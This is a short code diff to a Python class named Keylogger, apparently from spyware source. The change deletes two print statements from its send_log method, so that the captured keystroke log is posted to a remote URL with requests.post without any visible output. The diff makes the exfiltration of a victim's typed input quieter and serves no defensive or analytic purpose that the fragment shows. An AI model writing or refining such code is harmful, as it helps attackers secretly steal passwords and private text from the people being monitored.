@@ -33,8 +33,6 @@ class Keylogger:
         self.log += name
 
     def send_log(self, url, log):
-        print('sending...')
-        print(log)
         data = {'log': log}
         requests.post(url, json=data)
 
